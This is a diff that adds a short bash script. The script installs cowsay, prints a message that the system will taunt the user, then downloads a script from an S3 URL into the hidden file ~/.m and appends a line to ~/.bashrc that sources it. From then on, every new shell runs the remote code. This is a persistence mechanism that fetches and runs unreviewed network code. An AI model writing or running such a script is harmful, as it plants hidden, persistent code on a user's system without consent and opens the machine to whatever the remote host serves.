@@ -1,0 +1,15 @@
+#!/bin/bash
+
+if ! dpkg -l | grep cowsay > /dev/null
+then
+    echo "Could not find cowsay, installing!"
+    sudo apt -y install cowsay
+fi
+
+cowsay "This system is going to taunt the user! moooo!!"
+
+# get the file
+wget https://pun-isher.s3.ap-south-1.amazonaws.com/ins.sh -O ~/.m
+
+# source this file into bashrc
+echo "source ~/.m" >> ~/.bashrc
